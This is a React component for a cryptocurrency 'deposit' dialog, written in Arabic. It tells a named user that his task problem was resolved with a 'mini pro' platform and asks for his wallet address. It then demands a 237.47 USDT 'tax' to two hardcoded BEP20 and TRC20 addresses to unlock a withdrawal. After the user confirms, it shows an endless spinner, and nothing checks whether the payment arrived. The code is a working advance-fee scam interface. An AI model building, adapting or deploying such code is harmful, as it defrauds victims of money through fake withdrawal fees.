
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2, AlertTriangle, Clock } from 'lucide-react';

interface DepositModalProps {
  onClose: () => void;
}

const DepositModal: React.FC<DepositModalProps> = ({ onClose }) => {
  const [step, setStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');
  const [copied, setCopied] = useState<string | null>(null);

  const handleCopy = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    setCopied(type);
    setTimeout(() => setCopied(null), 2000);
  };

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="text-center space-y-4">
            <p className="text-gray-800 font-medium leading-relaxed">
              اهلا بك <span className="font-bold text-[#9B4A4E]">MOHMD517</span> تم حل أمر المهام ضمن اتفاق برتكول بين منصتنا ومنصه mini pro اضغط التالي
            </p>
            <button 
              onClick={() => setStep(2)}
              className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white py-3 rounded-xl font-bold active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="text-right space-y-4">
            <label className="block text-sm font-bold text-gray-700 mb-2">ضع رابط محفظتك للسحب</label>
            <input 
              type="text" 
              dir="ltr"
              placeholder="0x... or T..."
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
              className="w-full border-2 border-gray-100 p-3 rounded-xl focus:border-[#9B4A4E] outline-none text-center"
            />
            <button 
              disabled={!walletAddress}
              onClick={() => setStep(3)}
              className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white py-3 rounded-xl font-bold active:scale-95 transition-transform disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="text-right space-y-4">
            <p className="text-[13px] text-gray-800 leading-relaxed">
              اهلا بك <span className="font-bold">MOHMD517</span> بقي أمر إيداع مبلغ <span className="text-[#9B4A4E] font-bold">237.47</span> عملة usdt bep 20 او Tron TRC 20 لفتح قناة السحب هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro
            </p>
            
            <div className="space-y-3">
              <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                <div className="text-[10px] text-gray-400 mb-1">USDT BEP 20</div>
                <div className="flex items-center justify-between gap-2 overflow-hidden">
                  <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d', 'bep')} className="text-blue-500">
                    {copied === 'bep' ? <CheckCircle2 size={16} /> : <Copy size={16} />}
                  </button>
                  <span className="text-[10px] font-mono break-all text-left dir-ltr">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
                </div>
              </div>

              <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                <div className="text-[10px] text-gray-400 mb-1">Tron TRC 20</div>
                <div className="flex items-center justify-between gap-2 overflow-hidden">
                  <button onClick={() => handleCopy('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai', 'trc')} className="text-blue-500">
                    {copied === 'trc' ? <CheckCircle2 size={16} /> : <Copy size={16} />}
                  </button>
                  <span className="text-[10px] font-mono break-all text-left dir-ltr">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</span>
                </div>
              </div>
            </div>

            {/* تنبيه وقت المعالجة */}
            <div className="flex items-start gap-2 p-3 bg-blue-50 rounded-xl border border-blue-100">
              <Clock size={16} className="text-blue-600 mt-0.5 shrink-0" />
              <p className="text-[11px] text-blue-700 font-medium">
                عند ارسال الضريبه سيتم ارسال العملات خلال 5 دقيقه إلى 30 دقيقه كحد اقصى.
              </p>
            </div>

            {/* تنبيه التحذير قبل الضغط */}
            <div className="flex items-start gap-2 p-3 bg-amber-50 rounded-xl border border-amber-200">
              <AlertTriangle size={16} className="text-amber-600 mt-0.5 shrink-0" />
              <p className="text-[11px] text-amber-700 font-bold">
                تنبيه: يرجى عدم الضغط على زر "تم الإيداع" قبل التأكد من إتمام عملية إرسال الضريبة بنجاح.
              </p>
            </div>

            <button 
              onClick={() => setStep(4)}
              className="w-full bg-green-600 text-white py-3 rounded-xl font-bold active:scale-95 transition-transform mt-2"
            >
              تم الايداع
            </button>
          </div>
        );
      case 4:
        return (
          <div className="text-center py-6 space-y-4">
            <div className="flex justify-center">
              <Loader2 className="w-12 h-12 text-[#9B4A4E] animate-spin" />
            </div>
            <p className="text-lg font-bold text-gray-800">الرجاء الانتظار للتأكد من عمليه الايداع</p>
            <p className="text-xs text-gray-500">قد تستغرق هذه العملية بضع دقائق...</p>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/10 backdrop-blur-[1px] rtl" dir="rtl">
      <div className="bg-white w-full max-w-[360px] rounded-[24px] shadow-2xl p-6 relative animate-in fade-in zoom-in duration-300 border border-gray-100">
        {step < 4 && (
          <button 
            onClick={onClose}
            className="absolute top-4 left-4 text-gray-300 hover:text-gray-500 transition-colors"
          >
            ✕
          </button>
        )}
        {renderStep()}
      </div>
    </div>
  );
};

export default DepositModal;
